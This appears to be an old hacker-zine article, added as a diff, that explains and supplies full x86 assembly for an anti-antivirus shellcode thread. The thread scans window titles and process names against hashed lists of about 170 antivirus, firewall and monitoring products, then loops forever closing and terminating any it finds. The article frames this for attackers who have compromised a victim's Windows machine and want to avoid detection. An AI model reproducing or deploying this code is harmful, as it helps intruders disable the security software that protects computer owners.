@@ -1,0 +1,400 @@
+                            Killing AV & FW locally
+                            ~~~~~~~~~~~~~~~~~~~~~~~
+                            
+ Consider the following situation: you need to hack into some win32 box; you've
+ found an exploitable service on it, you wrote (or adapted) the shellcode for 
+ the target platform and made it bind a shell to a port or download a trojaned 
+ file. But the lamer running it has a "home firewall system", and every attempt
+ to connect() or bind() will alert him, possibly discovering the attacker or the
+ security flaw itself.
+ 
+ You, as an attacker, no nothing about this FW (firewall), it could be a simple 
+ winsock interceptor or port blocker, or some complex TDI winsock layer 
+ analyzer, almost impossible to perceive with normal sys monitoring tools. The 
+ least thing the shellcode can do is to detect it's presence and, if possible, 
+ terminate it's process.
+ 
+ This method, in a much simplified way, was originally used by viruses against 
+ AV (Anti-Virus) monitors and is commonly designated as a "retro" technique.
+ 
+ The first problem arising is: How can I be 100% sure which process is AV/FW one
+ and how can I detect it? The answer is not easy to implement and would include
+ different methods of detection. The two most complete ways I found include:
+ 
+ 1) Title window substring signature scan
+ 2) Process's executable module name signature scan
+ 
+ Their implementation should be as generic as possible, using only native win32 
+ API and, if possible, irreversible to some point, ie: you can't find a list of 
+ "unwanted" programs by simple disassembling. That would mean the usage of hash
+ tables instead of raw ASCIIZ strings. 
+ 
+ The code should be run in a separate thread, detecting any AV/FW that are ran 
+ by user. Enough theory, let' get to the code.
+
+                                      ***
+
+ ; since we're writing a thread, we'd better put the source code in a proc
+ 
+ anti_av_thread		proc	pascal
+
+ ; reserve space for scoped variables
+
+			local	wh
+			local	buffer:byte:512
+			local	pid
+			local	p_handle
+			local	p_entry:PROCESSENTRY32
+
+ ; we put the delta handle in ebx and patch a callback delta handle. EnumWindows
+ ; function fucks up registers prior to calling the callback function.
+
+			call	$+5
+ avdelta:		pop	ebx
+ 
+ ; all variables will be accessed in a form <varname> _AV
+ 
+ _AV			equ	<-avdelta[ebx]>
+
+			mov	__av_ebp_patch _AV, ebp
+			mov	__av_ebx_patch _AV, ebx
+			mov	__av_ebp_patch_ _AV, ebp
+			
+ ; We call EnumWindows API in order to enumerate all open windows. __av_win_enum
+ ; is our callback procedure. EnumWindows() will return when __av_win_enum
+ ; returns FALSE or when enumeration is complete - the latter is the case in
+ ; this code. NOTICE: It is assumed that the addresses of all APIs are stored
+ ; in a form _<apiname> dd <api's address>. If you don't know how to get them,
+ ; see my "Designing win32 shellcode" paper. 
+ 
+			
+ __kill_av:		push	ebx				; WinXP ebx fuck-up!!
+			push	0
+			lea	eax, __av_win_enum _AV
+			push	eax
+			call	_EnumWindows _AV
+			pop	ebx
+
+ ; process scan is done with toolhelp32 set of functions. First we create a
+ ; snapshot of all processes running.
+
+			push	0
+			push	TH32CS_SNAPPROCESS
+			call	_CreateToolhelp32Snapshot _AV
+			
+			inc	eax
+			jz	__end__snapshot
+			dec	eax
+			mov	p_handle, eax
+
+ ; after storing the search handle, we call Process32First() and Process32Next()
+ ; functions in order to parse the processes' PROCESSENTRY32 structures. But
+ ; first we make sure it isn't our process.
+
+			lea	ecx, p_entry
+			mov	[ecx.dwSize], size PROCESSENTRY32
+			push	ecx
+			push	eax
+			call	_Process32First _AV
+ __cycle_procs:		test	eax, eax
+			jz	__proc_done
+			
+			call	_GetCurrentProcessId _AV
+			cmp	eax, p_entry.th32ProcessID
+			jz	__next_proc
+			
+ ; we get the process's executable module filename, and parse it until we reach
+ ; the path separator '\'. After that, we convert it to lowercase.
+
+			lea	esi, p_entry.szExeFile
+ __slash:		mov	edx, esi
+ __endsz:		lodsb
+			cmp	al, '\'
+			jz	__slash
+			test	al, al
+			jnz	__endsz
+
+			mov	esi, edx
+			call	lowercase
+			mov	edx, esi
+			
+ ; we calculate it's hash (not including the extension). See the description of 
+ ; algo in my other paper.
+
+			xor	eax, eax
+ __hasherize:		rol	eax, 7
+			xor	al, [edx]
+			inc	edx
+			cmp	byte ptr [edx], '.'
+			jz	__out		
+			cmp	byte ptr [edx], 0
+			jnz	__hasherize
+
+ ; just in case, we compare it the list of "good hashez", ie: system programs
+ ; that shouldn't be terminated at any case. See the good_namez definition for
+ ; the list of complete names.
+
+ __out:			lea	edi, good_namez _AV
+			mov	ecx, good_namez_numba
+			repnz	scasd
+			jz	__next_proc
+
+ ; we check whether it is a "bad name" :)
+			
+			lea	edi, bad_namez _AV
+			mov	ecx, bad_namez_numba
+			repnz	scasd
+			jnz	__next_proc
+
+ ; if so, we elegantly terminate it's process....under the assumption we have
+ ; the corresponding privilege.
+			
+			push	p_entry.th32ProcessID
+			push	0
+			push	PROCESS_TERMINATE
+			call	_OpenProcess _AV
+			
+			push	0
+			push	eax
+			call	_TerminateProcess _AV
+
+ ; we get the next process in a list, and if it's the end of the list, we close
+ ; the search handle, sleep for 50 ms (we must give system some time to preform
+ ; process killing if it occured...we don't want to consume system resources
+ ; by doing all this 50 times for a single "bad" process), and restart the 
+ ; killa-loop.
+
+ __next_proc:		lea	eax, p_entry
+			push	eax
+			push	p_handle
+			call	_Process32Next _AV
+			jmp	__cycle_procs
+			
+			test	eax, eax
+			jnz	__cycle
+			pop	eax
+			
+ __proc_done:		push	p_handle
+			call	_CloseHandle _AV
+			
+ __end__snapshot:	push	50
+			call	_Sleep _AV
+
+			jmp	__kill_av
+
+; callback procedure for EnumWindows(). It is called somewhere from system space
+; and because of that all the registers are fucked up. So, we patch the delta 
+; handle and ebp (pointer to local variables) at the start of the thread.
+
+ __av_win_enum:		push	ebp 
+			mov	ebp, 0
+			org	$-4
+			
+ __av_ebp_patch		dd	?
+ 
+ ; first paramater to callback procedure: handle to parent window enumerating
+ 
+			mov	eax, [esp.Pshd.Arg1]
+			mov	wh, eax
+
+; after storing it to a scoped variable wh, we restore the ebp, save all the
+; registers (because the code execution is returning to system space), and patch
+; ebp and ebx
+			
+			pop	ebp
+			pusha
+			mov	ebx, 0
+			org	$-4
+
+ __av_ebx_patch		dd	?	
+
+			mov	ebp, 0
+			org	$-4
+ 
+ __av_ebp_patch_	dd	?
+
+ ; we get the PID of the process that created the window
+
+			push	ecx
+			push	esp
+			push	wh
+			call	_GetWindowThreadProcessId _AV
+
+			pop	ecx
+			mov	pid, ecx
+			jecxz	__end__end
+
+ ; we get the window's title bar and convert it to loweracse
+
+			push	512
+			lea	esi, buffer
+			push	esi
+			push	wh
+			call	_GetWindowTextA _AV
+			
+			xchg	eax, ecx
+			jecxz	__end__end
+
+			call	lowercase
+
+ ; setup registers for string processing. av_names_numba is the number of the 
+ ; namez hashes stored inside av_namez_hashes and av_names_length is a 
+ ; byte-array of length of each name.
+
+			push	ebx
+			mov	edx, ecx
+			mov	ecx, av_names_numba
+			lea	edi, av_namez_hashes _AV
+			lea	ebx, av_names_length _AV
+
+ ; we calculate the number of steps to search the substring. For example, if the
+ ; window title has 17 chars, and a bad name, let's say "firewall" has 8 chars,
+ ; the number of steps is 17-8+1=10. If the result is negative, we skip that
+ ; hash.
+
+ __process_string:	pusha
+			mov	ecx, edx
+			movzx	ebx, [ebx].byte ptr 0
+			sub	ecx, ebx
+			inc	ecx
+			js	__too_lil_end
+			jecxz	__too_lil_end
+
+ ; we calculate the substring hash starting from esi, ebx bytes, ecx times, and
+ ; if not found, we try the other hashes
+
+ __cycle:		push	ebx
+			push	esi
+			xor	edx, edx
+ __hash:		rol	edx, 7
+			xor	dl, [esi]
+			lodsb
+			dec	ebx
+			jnz	__hash
+			pop	esi
+			pop	ebx
+			lodsb
+			
+			cmp	edx, [edi]
+			jz	__found
+			loop	__cycle
+			
+			add	[esp.Pushad_edi], 4
+			inc	[esp.Pushad_ebx]
+			popa
+			loop	__process_string
+
+ ; restore thre registers and return TRUE so that the callback procedure keeps
+ ; being called for every window handle.
+
+ __end__kend:		pop	ebx
+
+ __end__end:		popa
+			push	1
+			pop	eax
+			retn
+
+ __too_lil_end:		popa
+			jmp	__end__kend
+
+ ; if we found a bad window title, we firstly try to close the program by
+ ; sending a WM_QUIT message to it's parent window, simulating a normal user
+ ; clickt-to-exit action. We sleep for 10ms, giving the win23 message subsystem
+ ; some time to process the request, and then terminate the process.
+
+ __found:		popa
+			pop	ebx
+
+			xor	esi, esi
+			push	esi
+			push	esi
+			push	WM_QUIT
+			push	wh
+			call	_PostMessageA _AV
+			
+			push	10
+			call	_Sleep _AV
+			
+			push	pid
+			push	esi
+			push	PROCESS_TERMINATE
+			call	_OpenProcess _AV
+			
+			push	esi
+			push	eax
+			call	_TerminateProcess _AV
+			
+			popa
+			retn
+
+ ; the very very end. Why would anyone try to reach this point? Uhm, dunno...
+ ; You might wanna protect the thread with SEH, and put the handler here, so
+ ; that when a critical error occurs, thread restarts manually. In that case,
+ ; define a dword h_av_thread to store the thread handle.
+
+ __end:			push	(h_av_thread _AV).dword ptr 0
+			call	_CloseHandle _AV
+			
+			mov	eax, anti_av_thread _AV
+			call	_Create_Thread _AV
+			mov	h_av_thread _AV, eax
+			
+			push	0
+			call	_ExitThread _AV
+
+ av_namez_hashes:	whash	<virus, anti, firewall, process, zonealarm, amon, nod32, blackice, kill98, norton>
+			whash	<kv3000, cilin, av98, dr.web, trojan, winrescue, lockdown, avp, sophos, f-prot>
+			whash	<mcafee, e-scan, kaspersky, kav, wintop, apispy, apimon, sysview, sysmon, apithunk>
+			whash	<procdump>
+ av_names_numba		equ	($-av_namez_hashes)/4
+
+ av_names_numba_start:
+ av_names_length	db	5, 4, 8, 7, 9, 4, 5, 8, 6, 6
+			db	6, 5, 4, 6, 6, 9, 8, 3, 6, 6
+			db	6, 6, 9, 3, 6, 6, 6, 7, 6, 8
+			db	8
+
+ good_namez:		whash	<kernel32, msgsrv32, mprexe, mmtask, mstask, explorer, internat, taskmon, systray, rundll>
+			whash	<wmiexe, winoa386, system, [system|process], [system|idle|process], smss, os2ss, os2srv>
+			whash	<csrss, winlogon, services, lsass, svchost, spoolsv, regsvc, ntvdm, cmd, taskmgr>
+			whash	<nddeagnt, spoolss, rpcss, tapisrv, rasman>
+ good_namez_numba	equ	($-good_namez)/4
+
+ bad_namez:		whash	<pop3scan, nod32, nod32cc, amon, _avp32, _avpcc, npssvc, nresq32, nsched32> 
+			whash	<nschednt, nsplugin, nav, navapsvc, navapw32, navlu32, navrunr, navw32, _avpm, alertsvc>
+			whash	<avp32, avpcc, avpm, n32scanw, navwnt, antivir, avpupd, avgctrl, avwin95, scan32, vshwin32>
+			whash	<f-stopw, f-prot95, ackwin32, vettray, vet95, sweep95, pccwin98, iomon98, avptc, ave32>
+			whash	<avconsol, fp-win, dvp95, f-agnt95, claw95, nvc95, scan, virus, lockdown2000, norton>
+			whash	<mcafee, pcciomon, pccmain, pop3trap, webtrap, avsynmgr, vsstat, nmain, luall, lucomserver>
+			whash	<iamapp, atrack, nisserv, rescue32, symproxysvc, nisum, pview95, webscanx, safeweb, icmon>
+			whash	<cfinet, cfinet32, avp, zonealarm, wink, zapro, zatutor, vmon, zauinst, minilog>
+			whash	<lockdown, ants, fast, guard, update, autoupdate, tc, spyxx, clean, drwatson>
+			whash	<sfc, msinfo32, cleaner, lsetup, aupdate, lual, luinit, navstub, bootwarn, qconsole>
+			whash	<qserver, navdx, undoboot, cfgwiz, moolive, tca, tcm, tds-3, ss3edit, anti_trojan>
+			whash	<atcon, atupdater, atwatch, wgfe95, poproxy, nprotect, ndd32, mcagent, mcupdate, watchdog>
+			whash	<taumon, iamaserv, sphinx, vsecomr, icload95, icsupp95, icloadnt, icsuppnt, frw, firewall>
+			whash	<antivirus, blackice, blackd, wrctrl, wradmin, cleaner3, pcfwallicon, aplica32, cfiadmin>
+			whash	<cfiaudit, tds2-98, tds2-nt, nvarch16, vsmain, persfw, pavproxy, mssmmc32, trjscan, defwatch>
+			whash	<vpc42, rtvscn95, vptray, mgui, apvxdwin, fsav, agentsvr, rrguard, rescue, rshell>
+			whash	<apimonitor, cleanpc, pstat, wintop, anti-trojan, borg2, iamserv, vsmon>
+ bad_namez_numba	equ	($-bad_namez)/4
+
+ anti_av_thread		endp
+ 
+ ; procedure for converting the string to lowercase
+ 
+ lowercase:		push	esi
+ __loop:		lodsb
+			cmp	al, 'A'
+			jb	__skip
+			cmp	al, 'Z'
+			ja	__skip
+			add	al, 32
+			mov	[esi-1].byte ptr 0, al
+ __skip:		test	al, al
+			jnz	__loop
+			pop	esi
+			retn
+                      
+                                      ***
+ 
